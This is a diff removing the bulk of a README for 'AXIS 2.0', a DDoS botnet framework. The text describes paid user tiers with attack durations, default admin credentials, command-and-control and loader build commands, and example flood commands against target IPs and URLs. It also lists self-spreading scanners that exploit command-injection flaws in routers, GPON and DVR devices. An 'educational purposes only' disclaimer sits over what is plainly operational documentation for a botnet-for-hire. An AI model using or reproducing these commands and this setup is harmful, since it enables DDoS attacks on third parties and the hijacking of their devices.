-| **Basic** | 120 seconds | 100 | tcp, udp, icmp, http |
-| **Premium** | 180 seconds | 500 | Basic + ovhtcp, ovhudp, dns-amp |
-| **VIP** | 600 seconds | Unlimited | Premium + all amp, gre, axis-* |
-| **Admin** | Unlimited | Unlimited | All methods |
-
-### Default Credentials (CHANGE IMMEDIATELY!)
-
-```
-Username: admin
-Password: admin123  ← CHANGE THIS!
-Tier: admin
-API Key: AXIS2-ADMIN-APIKEY
-```
-
-### Admin Commands
-
-```bash
-# Create user with tier selection
-adduser
-# Prompts: Username, Password, Tier (basic/premium/vip/admin), Botcount, Cooldown
-
-# Upgrade user tier
-upgradeuser
-# Prompts: Username, New tier
-
-# List all users
-listusers
-# Shows: Username, Tier, API Key
-
-# Remove user
-deluser
-# Prompts: Username to remove
-```
-
-### Database File Location
-
-```
-cnc/database.json
-```
-
-### Backup Database
-
-```bash
-cp cnc/database.json cnc/database.backup.json
-```
-
-### Restore Database
-
-```bash
-cp cnc/database.backup.json cnc/database.json
-```
-
----
-
-## 📚 Documentation Files
-
-| File | Description |
-|------|-------------|
-| `README.md` | Main documentation (this file) |
-| `QUICK_SETUP.txt` | Quick installation guide |
-| `TROUBLESHOOTING.txt` | Comprehensive troubleshooting guide |
-| `AXIS-L4_README.md` | AXIS-TCP/AXIS-UDP Layer 4 attack documentation |
-| `AXIS-L7_README.md` | AXIS-L7 Layer 7 attack documentation |
-| `cnc/JSON_DATABASE_GUIDE.md` | Complete JSON database guide |
-
----
-
-## 🔒 Security Considerations
-
-### Change These Before Deployment
-
-1. **Admin password** in `database.json` or via admin panel
-2. **API key** for admin user
-3. **Server SSH keys** (disable password auth)
-4. **Firewall rules** (only required ports open)
-5. **Database file permissions** (chmod 600 database.json)
-
-### Recommended Security Measures
-
-1. **Fail2ban** for SSH protection
-2. **Automatic security updates**
-3. **Regular database backups**
-4. **Log rotation** for all log files
-5. **DDoS-protected hosting**
-6. **Rate limiting** on admin panel
-7. **IP whitelisting** for admin access
-8. **Regular security audits**
-
----
-
-## ⚠️ Legal Disclaimer
-
-**WARNING**: This software is provided for **EDUCATIONAL PURPOSES ONLY**.
-
-- Only use on networks you **OWN** or have **EXPLICIT PERMISSION** to test
-- Unauthorized use is **ILLEGAL** in virtually all jurisdictions
-- The authors are **NOT RESPONSIBLE** for misuse of this software
-- Compliance with all applicable laws is **YOUR RESPONSIBILITY**
-
-By using this software, you agree to:
-- Use only for educational purposes and security research
-- Comply with all applicable local, state, national, and international laws
-- Not use for unauthorized attacks against third-party systems
-- Take full responsibility for your actions and their consequences
-
-**Potential Legal Consequences of Unauthorized Use:**
-- Criminal charges (computer fraud, unauthorized access)
-- Civil liability (damages, injunctions)
-- Imprisonment (varies by jurisdiction)
-- Substantial fines
-
----
-
-## 👥 Credits & Version Info
-
-**Developed by AXIS Group**
-
-**Version**: 2.0  
-**Release Date**: March 2026  
-**License**: Educational use only
-
-### Changelog (v2.0)
-
-**New Additions:**
-- Randox86 scanner (Go + C) - `/admin/service/run` JSON injection
-- Fiber/GPON scanner (Go + C) - Boa server `formTracert` exploit
-- DVR scanner improved (Go + C) - XML NTP server injection (35 creds)
-- Zhone scanner improved (Go + C) - Ping diagnostic injection (6 creds)
-
-**Improvements:**
-- All scanners now have both Go (server-side) and C (bot self-rep) versions
-- Session key extraction for Zhone scanner
-- Base64 authentication for HTTP Basic Auth
-- Improved payload delivery mechanisms
-
-**Total Arsenal:**
-- 16 attack methods (9 L4 + 5 Amp + 2 L7)
-- 14 bot self-replication scanners
-- 7 server-side scanners (Go-based)
-- 13 architecture support for bot binaries
-
----
-
-## 📖 Quick Command Reference
-
-### Build Commands
-```bash
-./build.sh                    # Build everything
-./cnc_server                  # Start C&C
-./scanListen                  # Start scan listener
-./loader < ips.txt            # Start loader
-```
-
-### Admin Panel Commands
-```bash
-help                          # Show help
-layer4                        # L4 attack methods
-layer7                        # L7 attack methods
-admin                         # Admin commands
-ports                         # Common ports
-```
-
-### Attack Examples
-```bash
-!tcp 1.2.3.4 300 dport=80
-!udp 1.2.3.4 300 dport=53
-!ultimate-l4 1.2.3.4 300 dport=80
-!ultimate-l7 https://target.com/ 300 domain=target.com
-!stop                          # Stop all attacks
-```
-
-### Scanner Commands
-```bash
-# Run all extrascanners
-cd extrascanners && ./run-all.sh YOUR_IP 1000
-
-# Individual scanners
-./telnet-scanner leaks/10.lst 1000
-./zhone zhone-targets.txt YOUR_IP 500
-./dvr dvr-targets.txt YOUR_IP 500
-```
-
----
-
-**AXIS 2.0 - Complete DDoS Framework**  
-**For educational purposes only**
+**Version:** 2.0 P2P Torrent Edition
+**Last Updated:** April 2026
+**Status:** Production Ready
